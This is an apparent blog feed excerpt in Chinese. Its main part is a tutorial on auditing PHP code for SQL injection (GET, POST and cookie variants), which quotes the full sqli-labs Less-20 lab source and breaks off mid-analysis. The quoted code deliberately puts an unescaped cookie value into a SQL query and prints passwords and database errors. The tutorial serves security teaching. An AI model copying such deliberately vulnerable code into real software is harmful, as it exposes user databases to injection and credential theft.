href="https://www.cnblogs.com/iAmSoScArEd/p/10651947.html#auto_id_6">https://www.cnblogs.com/iAmSoScArEd/p/10651947.html#auto_id_6</a></p><p><a href="https://www.php.net/manual/zh/">https://www.php.net/manual/zh/</a></p><p><a href="https://www.freebuf.com/articles/web/266565.html">https://www.freebuf.com/articles/web/266565.html</a></p><p><a href="https://www.php.net/manual/zh/wrappers.php">https://www.php.net/manual/zh/wrappers.php</a></p>]]></content>
    
    
    <summary type="html">文件上传、文件下载、文件删除、文件包含漏洞函数及审计思路。</summary>
    
    
    
    <category term="代码审计" scheme="https://fz1lin.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="PHP" scheme="https://fz1lin.com/tags/PHP/"/>
    
    <category term="文件类型漏洞" scheme="https://fz1lin.com/tags/%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>命运交错的路口</title>
    <link href="https://fz1lin.com/2021/5071042/"/>
    <id>https://fz1lin.com/2021/5071042/</id>
    <published>2021-12-16T01:09:50.000Z</published>
    <updated>2021-12-18T04:40:05.629Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="532776c077cd50a18105faff1154de3851140b237d12780b78c6772419f04629"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入您获取到的密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">此文章目前需要密码，暂不对外开放哟。</summary>
    
    
    
    <category term="生活" scheme="https://fz1lin.com/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
    <category term="private" scheme="https://fz1lin.com/tags/private/"/>
    
    <category term="Life" scheme="https://fz1lin.com/tags/Life/"/>
    
  </entry>
  
  <entry>
    <title>PHP代码审计-SQL注入基础</title>
    <link href="https://fz1lin.com/2021/3145843663/"/>
    <id>https://fz1lin.com/2021/3145843663/</id>
    <published>2021-12-13T11:23:45.000Z</published>
    <updated>2021-12-13T11:29:56.610Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-SQL注入原理"><a href="#0x01-SQL注入原理" class="headerlink" title="0x01 SQL注入原理"></a>0x01 SQL注入原理</h2><h3 id="1-SQL-注入概述"><a href="#1-SQL-注入概述" class="headerlink" title="1.SQL 注入概述"></a>1.SQL 注入概述</h3><p>SQL注入的产生是web代码中可控的参数没有进行过滤或没有进行有效的过滤，与程序中原有的SQL语句拼接，被带入SQL模板中编译执行，造成了漏洞，漏洞点就在与数据库交互的地方。</p><p>SQL注入的危害，取决于对目标的造成的危害程度</p><ul><li>webshell，命令执行、服务器提权，获取数据库数据等</li><li>获取数据版本信息，账号登录等</li></ul><h3 id="2-SQL注入的条件"><a href="#2-SQL注入的条件" class="headerlink" title="2.SQL注入的条件"></a>2.SQL注入的条件</h3><ol><li>可控的参数</li><li>参数未过滤或过滤不完整</li><li>可控的参数与数据库有交互</li></ol><h3 id="3-SQL注入的类型"><a href="#3-SQL注入的类型" class="headerlink" title="3.SQL注入的类型"></a>3.SQL注入的类型</h3><p>SQL注入分类</p><ul><li>注入的可控参数的类型，如：数字型注入和字符串注入</li><li>注入的产生，如：GET注入、POST注入、cookie注入、Header注入等</li><li>攻击的手法，如：普通注入、盲注、报错注入、延时注入、宽字节注入、二次注入等</li></ul><h3 id="4-SQL注入的漏洞场景"><a href="#4-SQL注入的漏洞场景" class="headerlink" title="4.SQL注入的漏洞场景"></a>4.SQL注入的漏洞场景</h3><p>GET请求：程序对应的功能，搜索，列表，详情，查看参数有没有过滤或使用预编译的占位符进行参数绑定。</p><p>POST请求：程序对应的功能，搜索，更新，查询，登录，忘记密码，找回密码，验证用户名是否存在等功能。</p><p>header头：如cookie注入，IP伪造注入（XFF），注册，登录处会获取IP，后端采用 HTTP_CLIENT_IP或X-FORWARD-FOR（XFF）进行获取，如果没有对其过滤，就会出现注入。</p><p><code>$_SERVER</code>：如果目标程序使用 GPC 转义的话，是不会对<a href="https://www.php.net/manual/zh/reserved.variables.server.php"><code>$_SERVER</code></a>转义的，如果不进行过滤也会造成漏洞。</p><h3 id="5-审计思路"><a href="#5-审计思路" class="headerlink" title="5.审计思路"></a>5.审计思路</h3><p>如果是 MySQL 注入，下手点，就是SQL语句，如 select、update、insert into、delete、alter等，就是前端写的代码与后端数据库可能存在交互的地方，都可能存在SQL注入。</p><h3 id="6-漏洞修复"><a href="#6-漏洞修复" class="headerlink" title="6.漏洞修复"></a>6.漏洞修复</h3><p>具体的可以参考这篇文档 <a href="https://www.cnblogs.com/iAmSoScArEd/p/10651947.html">Web常见漏洞描述及修复建议</a></p><p>总之用户的参数不可信原则，所有与数据库可能交互的地方都要进行过滤</p><h2 id="0x02-SQL注入审计案例"><a href="#0x02-SQL注入审计案例" class="headerlink" title="0x02 SQL注入审计案例"></a>0x02 SQL注入审计案例</h2><h3 id="1-GET型注入"><a href="#1-GET型注入" class="headerlink" title="1.GET型注入"></a>1.GET型注入</h3><p>这是 <a href="https://github.com/Audi-1/sqli-labs">sqli-labs</a>的靶场的 <a href="https://github.com/Audi-1/sqli-labs/tree/master/Less-2">Less-2</a> 的代码片段</p><p><img src="/2021/3145843663/image-20211213152517245.png" alt="image-20211213152517245"> </p><p>分析可以看出，该代码片段，从使用GET接受 id 参数到将<code>$id</code>参数带入SQL语句及使用 mysql_query 发送给数据库一个语句，未作出任何过滤或使用预编译的占位符进行参数绑定。由此我们可以构造payload进行SQL注入。</p><p>payload构造-因为没有进行过滤，可以任意构造，最终达到查询目的即可。</p><h3 id="2-POST-型注入"><a href="#2-POST-型注入" class="headerlink" title="2.POST 型注入"></a>2.POST 型注入</h3><p>这是 <a href="https://github.com/Audi-1/sqli-labs">sqli-labs</a>的靶场的 Less-12的代码片段</p><p><img src="/2021/3145843663/image-20211213180438672.png" alt="image-20211213180438672"> </p><p>分析代码：</p><p>可以看出使用<code>$_POST</code>接受的参数，直接带入了 SQL 语句，也没有过滤，还抑制了数据的报错（@，任何错误都会忽略）</p><h3 id="3-cookie注入"><a href="#3-cookie注入" class="headerlink" title="3.cookie注入"></a>3.cookie注入</h3><p>这是 <a href="https://github.com/Audi-1/sqli-labs">sqli-labs</a>的靶场的 Less-20的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;uname&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;div style=&#x27; margin-top:20px;color:#FFF; font-size:24px; text-align:center&#x27;&gt; Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&#x27;#FF0000&#x27;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;/div&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;div  align=&#x27;center&#x27; style=&#x27;margin:20px 0px 0px 510px;border:20px; background-color:#0CF; text-align:center;width:400px; height:150px;&#x27;&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;div style=&#x27;padding-top:10px; font-size:15px;&#x27;&gt;&quot;</span>;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;!--Form to post the contents --&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;form action=&quot; &quot; name=&quot;form1&quot; method=&quot;post&quot;&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27; &lt;div style=&quot;margin-top:15px; height:30px;&quot;&gt;Username : &amp;nbsp;&amp;nbsp;&amp;nbsp;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;   &lt;input type=&quot;text&quot;  name=&quot;uname&quot; value=&quot;&quot;/&gt;  &lt;/div&gt;&#x27;</span>;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27; &lt;div&gt; Password : &amp;nbsp; &amp;nbsp; &amp;nbsp;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;   &lt;input type=&quot;text&quot; name=&quot;passwd&quot; value=&quot;&quot;/&gt;&lt;/div&gt;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;   &lt;div style=&quot; margin-top:9px;margin-left:90px;&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/div&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/form&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;div style=&quot; margin-top:10px;color:#FFF; font-size:23px; text-align:center&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/center&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">20</span>); <span class="comment">// truncation (see comments)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (get_magic_quotes_gpc())  <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = stripslashes(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!ctype_digit(<span class="variable">$value</span>))   <span class="comment">// Quote if not a number</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = intval(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$uname</span> = check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line"><span class="variable">$passwd</span> = check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result1</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row1</span> = mysql_fetch_array(<span class="variable">$result1</span>);</span><br><span class="line"><span class="variable">$cookee</span> = <span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">setcookie(<span class="string">&#x27;uname&#x27;</span>, <span class="variable">$cookee</span>, time()+<span class="number">3600</span>);</span><br><span class="line">header (<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;I LOVE YOU COOKIES&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//echo &#x27;Your Cookie is: &#x27; .$cookee;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//echo &quot;Try again looser&quot;;</span></span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/font&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cookee</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line"><span class="variable">$format</span> = <span class="string">&#x27;D d M Y - H:i:s&#x27;</span>;</span><br><span class="line"><span class="variable">$timestamp</span> = time() + <span class="number">3600</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&lt;font color= &quot;red&quot; font size=&quot;4&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;YOUR USER AGENT IS : &quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;cyan&quot; font size=&quot;4&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;YOUR IP ADDRESS IS : &quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4 &gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;orange&quot; font size = 5 &gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;YOUR COOKIE : uname = <span class="subst">$cookee</span> and expires: &quot;</span> . date(<span class="variable">$format</span>, <span class="variable">$timestamp</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$result</span>)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;Issue with your mysql: &#x27;</span> . mysql_error());</span><br><span class="line">  &#125;</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&#x27;</span>;  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&lt;/b&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your ID:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//echo &#x27;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&#x27;;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;input  type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Delete Your Cookie!&quot; /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/form&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 6 &gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot; Your Cookie is deleted&quot;</span>;</span><br><span class="line">setcookie(<span class="string">&#x27;uname&#x27;</span>, <span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>], time()-<span class="number">3600</span>);</span><br><span class="line">header (<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/font&gt;&lt;/center&gt;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//header (&#x27;Location: main.php&#x27;);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//echo &#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&lt;/center&gt;&#x27;;</span></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=fopen(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">fwrite(<span class="variable">$fp</span>,<span class="string">&#x27;Cookie:&#x27;</span>.<span class="variable">$cookee</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">fclose(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p> 代码分析</p><p>当我们输入了账户和密码登录的时候，会将 <code>uname</code>字段存入 cookee中，当我们再次访问页面时，会判断cookee是否存在，如果存在则执行<code>$sql=&quot;SELECT * FROM users WHERE username=&#39;$cookee&#39; 